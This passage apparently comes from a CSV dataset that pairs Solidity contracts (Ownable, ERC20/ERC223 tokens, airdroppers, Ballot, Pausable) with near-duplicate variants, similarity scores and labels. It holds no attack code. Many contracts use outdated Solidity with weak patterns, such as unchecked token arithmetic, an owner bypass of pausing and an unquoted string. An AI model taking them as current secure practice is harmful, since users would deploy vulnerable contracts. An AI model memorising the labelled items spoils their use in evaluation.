        uint secondsAccountedFor = 0;
        uint16 year;
        uint numLeapYears;

        
        year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);
        numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);

        secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;
        secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);

        while (secondsAccountedFor > timestamp) {
            if (isLeapYear(uint16(year - 1))) {
                secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;
            }
            else {
                secondsAccountedFor -= YEAR_IN_SECONDS;
            }
            year -= 1;
        }
        return year;
    }

    function getMonth(uint timestamp) public pure returns (uint8) {
        return parseTimestamp(timestamp).month;
    }

    function getDay(uint timestamp) public pure returns (uint8) {
        return parseTimestamp(timestamp).day;
    }

    function getHour(uint timestamp) public pure returns (uint8) {
        return uint8((timestamp / 60 / 60) % 24);
    }

    function getMinute(uint timestamp) public pure returns (uint8) {
        return uint8((timestamp / 60) % 60);
    }

    function getSecond(uint timestamp) public pure returns (uint8) {
        return uint8(timestamp % 60);
    }

    function getWeekday(uint timestamp) public pure returns (uint8) {
        return uint8((timestamp / DAY_IN_SECONDS + 4) % 7);
    }

    function toTimestamp(uint16 year, uint8 month, uint8 day) public pure returns (uint timestamp) {
        return toTimestamp(year, month, day, 0, 0, 0);
    }

    function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) public pure returns (uint timestamp) {
        return toTimestamp(year, month, day, hour, 0, 0);
    }

    function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute) public pure returns (uint timestamp) {
        return toTimestamp(year, month, day, hour, minute, 0);
    }

    function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) public pure returns (uint timestamp) {
        uint16 i;

        
        for (i = ORIGIN_YEAR; i < year; i++) {
            if (isLeapYear(i)) {
                timestamp += LEAP_YEAR_IN_SECONDS;
            }
            else {
                timestamp += YEAR_IN_SECONDS;
            }
        }

        
        uint8[12] memory monthDayCounts;
        monthDayCounts[0] = 31;
        if (isLeapYear(year)) {
            monthDayCounts[1] = 29;
        }
        else {
            monthDayCounts[1] = 28;
        }
        monthDayCounts[2] = 31;
        monthDayCounts[3] = 30;
        monthDayCounts[4] = 31;
        monthDayCounts[5] = 30;
        monthDayCounts[6] = 31;
        monthDayCounts[7] = 31;
        monthDayCounts[8] = 30;
        monthDayCounts[9] = 31;
        monthDayCounts[10] = 30;
        monthDayCounts[11] = 31;

        for (i = 1; i < month; i++) {
            timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];
        }

        
        timestamp += DAY_IN_SECONDS * (day - 1);

        
        timestamp += HOUR_IN_SECONDS * (hour);

        
        timestamp += MINUTE_IN_SECONDS * (minute);

        
        timestamp += second;

        return timestamp;
    }
}",1,,,,,
"contract Ownable {
  address public owner;

  function Ownable() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    if (msg.sender != owner) {
      revert();
    }
    _;
  }

  function transferOwnership(address newOwner) onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }

}",0.919987401,"contract Ownable {
    
  address public owner;
 
  
  function Ownable() {
    owner = msg.sender;
  }
 
  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
 
  
  function transferOwnership(address newOwner) onlyOwner {
    require(newOwner != address(0));      
    owner = newOwner;
  }
 
}",2,,,,,
"contract Airdropper is Ownable {

    function multisend(address _tokenAddr, address[] dests, uint256[] values)
    onlyOwner
    returns (uint256) {
        uint256 i = 0;
        while (i < dests.length) {
           ERC20(_tokenAddr).transfer(dests[i], values[i]);
           i += 1;
        }
        return(i);
    }
}",0.968270037,"contract Multidrop is Ownable {



    function multisend(address _tokenAddr, address[] dests, uint256[] values)

    onlyOwner

    returns (uint256) {

        uint256 i = 0;

        while (i < dests.length) {

           ERC20(_tokenAddr).transfer(dests[i], values[i]);

           i += 1;

        }

        return(i);

    }

}",1,,,,,
"contract Ballot {
    
    
    
    struct Voter {
        uint weight; 
        bool voted; 
        address delegate; 
        uint vote; 
    }


    
    struct Proposal
    {
        bytes32 name; 
        uint voteCount; 
    }

    address public chairperson;

    
    
    mapping(address => Voter) public voters;

    
    Proposal[] public proposals;

    
    function Ballot(bytes32[] proposalNames) {
        chairperson = msg.sender;
        voters[chairperson].weight = 1;
        

        
        
        for (uint i = 0; i < proposalNames.length; i++) {
            
            
            
            proposals.push(Proposal({
                name: proposalNames[i],
                voteCount: 0
                }));
            }
    }

    
    
    function giveRightToVote(address voter) {
        if (msg.sender != chairperson || voters[voter].voted) {
            
            
            
            
            
            throw;
        }
        voters[voter].weight = 1;
    }

    
    function delegate(address to) {
        
        Voter sender = voters[msg.sender];
        if (sender.voted)
            throw;
        
        
        
        
        
        
        
        
        while (
            voters[to].delegate != address(0) &&
            voters[to].delegate != msg.sender
            ) {
            to = voters[to].delegate;
        }
        
        if (to == msg.sender) {
            throw;
        }
        
        
        sender.voted = true;
        sender.delegate = to;

        Voter delegate = voters[to];
        if (delegate.voted) {
            
            
            proposals[delegate.vote].voteCount += sender.weight;
        } else {
            
            
            delegate.weight += sender.weight;
        }
    }

    
    
    function vote(uint proposal) {
        Voter sender = voters[msg.sender];
        if (sender.voted)
            throw;
        sender.voted = true;
        sender.vote = proposal;
        
        
        
        proposals[proposal].voteCount += sender.weight;
    }

    
    
    function winningProposal() constant
        returns (uint winningProposal)
    {
        uint winningVoteCount = 0;
        for (uint p = 0; p < proposals.length; p++) {
            if (proposals[p].voteCount > winningVoteCount) {
                winningVoteCount = proposals[p].voteCount;
                winningProposal = p;
            }
        }
    }
}",0.90036304,"contract shy {



    struct Voter {

        uint weight;

        bool voted;

        uint8 vote;

        address delegate;

    }

    struct Proposal {

        uint voteCount;

    }



    address chairperson;

    mapping(address => Voter) voters;

    Proposal[] proposals;



    

    constructor(uint8 _numProposals) public {

        chairperson = msg.sender;

        voters[chairperson].weight = 1;

        proposals.length = _numProposals;

    }



    

    

    function giveRightToVote(address toVoter) public {

        if (msg.sender != chairperson || voters[toVoter].voted) return;

        voters[toVoter].weight = 1;

    }



    

    function delegate(address to) public {

        Voter storage sender = voters[msg.sender]; 

        if (sender.voted) return;

        while (voters[to].delegate != address(0) && voters[to].delegate != msg.sender)

            to = voters[to].delegate;

        if (to == msg.sender) return;

        sender.voted = true;

        sender.delegate = to;

        Voter storage delegateTo = voters[to];

        if (delegateTo.voted)

            proposals[delegateTo.vote].voteCount += sender.weight;

        else

            delegateTo.weight += sender.weight;

    }



    

    function vote(uint8 toProposal) public {

        Voter storage sender = voters[msg.sender];

        if (sender.voted || toProposal >= proposals.length) return;

        sender.voted = true;

        sender.vote = toProposal;

        proposals[toProposal].voteCount += sender.weight;

    }



    function winningProposal() public view returns (uint8 _winningProposal) {

        uint256 winningVoteCount = 0;

        for (uint8 prop = 0; prop < proposals.length; prop++)

            if (proposals[prop].voteCount > winningVoteCount) {

                winningVoteCount = proposals[prop].voteCount;

                _winningProposal = prop;

            }

    }

}",3,,,,,
"contract Token {
 
  function totalSupply() public pure returns (uint256 supply);

  
 
 function balanceOf(address _owner) public pure returns (uint256 balance);

 

 
 
 function transfer(address _to, uint256 _value) public returns (bool success);

  
 
 
 
 
  function transferFrom(address _from, address _to, uint256 _value) public 
  returns (bool success);

 
 
 
  
  function approve(address _spender, uint256 _value) public returns (bool success);

  
 
 
 function allowance(address _owner, address _spender) public pure returns (uint256 remaining);

 event Transfer(address indexed _from, address indexed _to, uint256 _value);
  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  uint public decimals;
 string public name;
  }",0.955037671,"contract ERC20Interface {

    uint256 public totalSupply;
    uint256 public decimals;
    
    function symbol() public view returns (string);
    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value); 
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract Ownable {

  address public owner;

  
  constructor() public {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
   require(msg.sender == owner);
    _;
   }

   
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));      
   owner = newOwner;
  }

 }",0.90972664,"contract Ownable {

  address public owner;





  

  function Ownable() public {

    owner = msg.sender;

  }





  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }





  

  function transferOwnership(address newOwner) public onlyOwner {

    if (newOwner != address(0)) {

      owner = newOwner;

    }

  }



}",2,,,,,
"contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender)
    public view returns (uint256);

    function transferFrom(address from, address to, uint256 value)
    public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}",0.975338071,"contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public constant returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}",1,,,,,
"contract JoseToken is IERC20 {

using SafeMath for uint256;

uint public  _totalSupply = 0;

string public constant symbol = ""VIC"";
string public constant name = ""JoseToken"";
uint8 public constant decimals = 18;

bool isEnabled;


uint256 public constant RATE = 500;

address public owner;

mapping(address => uint256) balances;
mapping(address => mapping(address => uint256)) allowed;

modifier isOwner() {
    require(msg.sender == owner);
    _;
}

function toggle() isOwner {
    isEnabled = !isEnabled;
}

function () payable {
    createTokens();
}

function JoseToken() {
    owner = msg.sender;
}

function createTokens() payable {
    require(msg.value > 0);
    require(isEnabled);

    uint256 tokens = msg.value.mul(RATE);
    balances[msg.sender] = balances[msg.sender].add(tokens);
    _totalSupply = _totalSupply.add(tokens);

    owner.transfer(msg.value);
}

function totalSupply () constant returns (uint256 totalSupply) {
    return _totalSupply;
}

function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances [_owner];
}

function transfer(address _to, uint256 _value) returns (bool success) {
    require(
        balances[msg.sender] >= _value
        && _value > 0
    );
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
}

function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
    require(
        allowed[_from][msg.sender] >= _value
        && balances[_from] >= _value
        && _value > 0
    );
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    Transfer(_from, _to, _value);
    return true;
}

function approve(address _spender, uint256 _value) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
}

function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
}

event Transfer(address indexed _from, address indexed _to, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);
",0.925026753,"contract CrowdsaleToken is StandardToken {

    using SafeMath for uint256;

    

    uint public _totalSupply = 10000000000000000000000000000;

    uint private _tokenSupply = 25000000000000000000000000;

    

    uint256 public constant RATE = 1000000;

    

    address public owner;

    

    string public constant symbol = ""XOXO"";

    string public constant name = ""Lust Token"";

    uint8 public constant decimals = 18;

    

    

    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;

    

    function () payable {

        createTokens();

    }



    function CrowdsaleToken() {

        balances[msg.sender] = _tokenSupply;

        owner = 0xDe0ABce6E55e4422100022e50f37D3E082524DBD;

    }

    

    function createTokens() payable {

        require(msg.value > 0);

        

        uint256 tokens = msg.value.mul(RATE);

        balances[msg.sender] = balances[msg.sender].add(tokens);

        

        owner.transfer(msg.value);

        

    }

    

    function totalSupply() constant returns (uint256 totalSupply) {

        return _totalSupply;

    }

    

    function balanceOf(address _owner) constant returns (uint256 balance) {

        return balances[_owner];

    }

    

    function transfer(address _to, uint256 _value) returns (bool success) {

        require(

            balances[msg.sender] >= _value

            && _value > 0

        );

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        Transfer(msg.sender, _to, _value);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        require(

            allowed[_from][msg.sender] >= _value

            && balances[_from] >= _value

            && _value > 0

        );

        balances[_from] = balances[_from].sub(_value);

        balances[_to] = balances[_to].add(_value);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

        Transfer(_from, _to, _value);

        return true;

    }

    

    function approve(address _spender, uint256 _value) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }

    

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",2,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 2;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    
    event Burn(address indexed from, uint256 value);

    
    constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                    
        name = tokenName;                                       
        symbol = tokenSymbol;                                   
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != address(0x0));
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, address(this), _extraData);
            return true;
        }
    }

    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        emit Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        emit Burn(_from, _value);
        return true;
    }

}",0.998681359,"contract TokenERC20 {

   

    string public name;

    string public symbol;

    uint8 public decimals = 18;

  

    uint256 public totalSupply;



  

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



   

    event Transfer(address indexed from, address indexed to, uint256 value);

 

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



   

    event Burn(address indexed from, uint256 value);



  

    constructor(

        uint256 initialSupply,

        string memory tokenName,

        string memory tokenSymbol

    ) public {

        totalSupply = initialSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;               

        name = tokenName;                                   

        symbol = tokenSymbol;                               

    }



   

    function _transfer(address _from, address _to, uint _value) internal {

      

        require(_to != address(0x0));



        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

       

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        emit Transfer(_from, _to, _value);

       

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }



   

    function transfer(address _to, uint256 _value) public returns (bool success) {

        _transfer(msg.sender, _to, _value);

        return true;

    }



   

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= allowance[_from][msg.sender]);    

        allowance[_from][msg.sender] -= _value;

        _transfer(_from, _to, _value);

        return true;

    }



   

    function approve(address _spender, uint256 _value) public

        returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



   

    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, address(this), _extraData);

            return true;

        }

    }



   

    function burn(uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);   

        balanceOf[msg.sender] -= _value;           

        totalSupply -= _value;                      

        emit Burn(msg.sender, _value);

        return true;

    }



   

    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value);                

        require(_value <= allowance[_from][msg.sender]);    

        balanceOf[_from] -= _value;                         

        allowance[_from][msg.sender] -= _value;             

        totalSupply -= _value;                             

        emit Burn(_from, _value);

        return true;

    }

}",1,,,,,
"contract SimpleStorage {
    uint storedData;
    function set(uint x) { storedData = x; }
    function get() constant returns (uint retVal) { return storedData; }
}",0.944187338,"contract SimpleStorage {
    uint storedData;

    function set(uint x) {
        storedData = x;
    }

    function get() constant returns (uint storedData) {
        return storedData;
    }
}",4,*,,,,
"contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  function Ownable() public {
    owner = msg.sender;
  }


  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }



  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0) && newOwner != owner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}",0.909721423,"contract Ownable {
    address public owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    
    
    constructor()
        public
    {
        owner = msg.sender;
    }

    
    modifier onlyOwner()
    {
        require(msg.sender == owner, ""NOT_OWNER"");
        _;
    }

    
    
    
    function transferOwnership(
        address newOwner
        )
        public
        onlyOwner
    {
        require(newOwner != address(0x0), ""ZERO_ADDRESS"");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}",2,,,,,
"contract ERC223ReceivingContract {
  function tokenFallback(address _from, uint256 _value, bytes _data) public;
  event TokenFallback(address indexed from, uint256 value, bytes data);
}",0.909932861,"contract ERC223ReceivingContract {

	event TokenReceived(address indexed from, uint value, bytes data);

	

    function tokenFallback(address _from, uint _value, bytes _data) public;

}",0,,,,,
"contract ERC223 {
    function transfer(address to, uint256 value, bytes data) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value, bytes data);
}",0.948300293,"contract ERC223 {
	function transfer(address _to, uint256 _value, bytes _data) public returns (bool success);
	event Transfer(address indexed _from, address indexed _to, uint _value, bytes _data);
}",1,,,,,
"contract ERC20 {
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}",0.967531813,"contract Token {
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}",1,,,,,
"contract mortal {
    
    address owner;

    
    function mortal() public { owner = msg.sender; }

    
    function kill() public { if (msg.sender == owner) selfdestruct(owner); }
}",0.913675674,"contract mortal is SimpleToken {
    
    address owner;

    
    function mortal() { owner = msg.sender; }

    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}",1,,,,,
"contract ERC20 {
    function transferFrom(address _from, address _to, uint _value) public returns (bool);
    function approve(address _spender, uint _value) public returns (bool);
    function allowance(address _owner, address _spender) public constant returns (uint);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}",0.925971831,"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) returns (bool);
  function approve(address spender, uint256 value) returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}",1,,,,,
"contract ERC223 {
    function transfer(address _to, uint _value, bytes _data) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}",0.910073854,"contract ERC223Basic is StandardToken {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}",1,,,,,
"contract Token {
    string internal _symbol;
    string internal _name;
    uint8 internal _decimals;
    uint internal _totalSupply = 1000;
    mapping (address => uint) internal _balanceOf;
    mapping (address => mapping (address => uint)) internal _allowances;

    function Token(string symbol, string name, uint8 decimals, uint totalSupply) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply;
    }

    function name() public constant returns (string) {
        return _name;
    }

    function symbol() public constant returns (string) {
        return _symbol;
    }

    function decimals() public constant returns (uint8) {
        return _decimals;
    }

    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }

    function balanceOf(address _addr) public constant returns (uint);
    function transfer(address _to, uint _value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}",0.979436974,"contract ERC20Basic {

  string internal _symbol;

  string internal _name;

  uint8 internal _decimals;

  uint internal _totalSupply;

  mapping (address => uint) internal _balanceOf;



  mapping (address => mapping (address => uint)) internal _allowances;



  function ERC20Basic(string symbol, string name, uint8 decimals, uint totalSupply) public {

      _symbol = symbol;

      _name = name;

      _decimals = decimals;

      _totalSupply = totalSupply;

  }



  function name() public constant returns (string) {

      return _name;

  }



  function symbol() public constant returns (string) {

      return _symbol;

  }



  function decimals() public constant returns (uint8) {

      return _decimals;

  }



  function totalSupply() public constant returns (uint) {

      return _totalSupply;

  }

  function balanceOf(address _addr) public constant returns (uint);

  function transfer(address _to, uint _value) public returns (bool);

  event Transfer(address indexed _from, address indexed _to, uint _value);

}",1,,,,,
"contract Airdrop1 is Ownable {

    function multisend(address _tokenAddr, address[] _to, uint256[] _value) public
    returns (bool _success) {
        assert(_to.length == _value.length);
        assert(_to.length <= 150);
        
        for (uint8 i = 0; i < _to.length; i++) {
                assert((Token(_tokenAddr).transfer(_to[i], _value[i])) == true);
            }
            return true;
        }
}",0.962785913,"contract NortonDropper is Ownable {



    function multisend(address _tokenAddr, address[] _to, uint256[] _value) public

    returns (bool _success) {

        assert(_to.length == _value.length);

        assert(_to.length <= 150);

        

        for (uint8 i = 0; i < _to.length; i++) {

                assert((Token(_tokenAddr).transfer(_to[i], _value[i])) == true);

            }

            return true;

        }

}",1,,,,,
"contract Ownable {
  address public owner;


  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  
  constructor() public {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}",0.991010058,"contract Ownable {
  address public owner;


  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );


  
  constructor() public {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}",0,,,,,
"contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;

  
  modifier whenNotPaused() {
    require(!paused || msg.sender == owner);
    _;
  }

  
  modifier whenPaused() {
    require(paused);
    _;
  }

  
    function _pause() public onlyOwner {
        require(!paused);
        paused = true;
        emit Pause();
    }

  
  function _unpause() onlyOwner whenPaused public {
    require(paused == true);
    paused = false;
    emit Unpause();
  }
}",0.901079264,"contract Pausable is Ownable {

  event Pause();

  event Unpause();

 

  bool public paused = false;

 

 

  

  modifier whenNotPaused() {

    require(!paused,""Contract is paused"");

    _;

  }

 

  

  modifier whenPaused() {

    require(paused,""Contract is not paused"");

    _;

  }

 

  

  function pause() onlyOwner whenNotPaused public {

    paused = true;

    emit Pause();

  }

 

  

  function unpause() onlyOwner whenPaused public {

    paused = false;

    emit Unpause();

  }

}",2,,,,,
"contract Owned {

  address owner;

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
}",0.973037677,"contract owned { 
    address owner;
    modifier onlyOwner()
    {
        require(msg.sender == owner);
        _;
    }
}",1,,,,,
"contract Mortal is Owned {
  function remove() onlyOwner {
    selfdestruct(owner);
  }
}",0.917775908,"contract Mortal is Owned {
    
    function kill() onlyOwner {
        selfdestruct(owner);
    }
}",0,,,,,
"contract MintableNonFungibleToken is NonFungibleToken {
    using SafeMath for uint;

    event Mint(address indexed _to, uint256 indexed _tokenId);

    modifier onlyNonexistentToken(uint _tokenId) {
        require(tokenIdToOwner[_tokenId] == address(0));
        _;
    }

    function mint(address _owner, uint256 _tokenId) public onlyNonexistentToken(_tokenId){
        _setTokenOwner(_tokenId, _owner);
        _addTokenToOwnersList(_owner, _tokenId);

        numTokensTotal = numTokensTotal.add(1);


        Mint(_owner, _tokenId);
    }
}",0.982254978,"contract MintableNonFungibleToken is NonFungibleToken {
    using SafeMath for uint;

    event Mint(address indexed _to, uint256 indexed _tokenId);

    modifier onlyNonexistentToken(uint _tokenId) {
        require(tokenIdToOwner[_tokenId] == address(0));
        _;
    }

    function mint(address _owner, uint256 _tokenId)
        internal
        onlyNonexistentToken(_tokenId)
    {
        _setTokenOwner(_tokenId, _owner);
        _addTokenToOwnersList(_owner, _tokenId);
        

        numTokensTotal = numTokensTotal.add(1);

        Mint(_owner, _tokenId);
    }
   
    
}",0,,,,,
"contract PRO {

    
    function totalSupply() constant returns (uint256 supply) {}

    
    
    function balanceOf(address _owner) constant returns (uint256 balance) {}

    
    
    
    
    function transfer(address _to, uint256 _value) returns (bool success) {}

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

    
    
    
    
    function approve(address _spender, uint256 _value) returns (bool success) {}

    
    
    
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",0.991562397,"contract Token {

    function totalSupply() constant returns (uint256 supply) {}


    function balanceOf(address _owner) constant returns (uint256 balance) {}

    function transfer(address _to, uint256 _value) returns (bool success) {}

 
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

    function approve(address _spender, uint256 _value) returns (bool success) {}

   
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",1,,,,,
"contract StandardToken is PRO {

    function transfer(address _to, uint256 _value) returns (bool success) {
        
        
        
        
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        
        
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}",0.994789005,"contract StandardToken is Token {



    function transfer(address _to, uint256 _value) returns (bool success) {

        

        if (balances[msg.sender] >= _value && _value > 0) {

            balances[msg.sender] -= _value;

            balances[_to] += _value;

            Transfer(msg.sender, _to, _value);

            return true;

        } else { return false; }

    }



    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

        

        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {

            balances[_to] += _value;

            balances[_from] -= _value;

            allowed[_from][msg.sender] -= _value;

            Transfer(_from, _to, _value);

            return true;

        } else { return false; }

    }



    function balanceOf(address _owner) constant returns (uint256 balance) {

        return balances[_owner];

    }



    function approve(address _spender, uint256 _value) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }



    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

      return allowed[_owner][_spender];

    }



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

    uint256 public totalSupply;

}",1,,,,,
"contract ERC20Token is StandardToken {

    function () {
        
        throw;
    }

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0';       







    function ERC20Token(
        ) {
        balances[msg.sender] = 700000;               
        totalSupply = 1000000;                        
        name = PRO ETHER;                                   
        decimals = 0;                            
        symbol = PRO;                               
    }
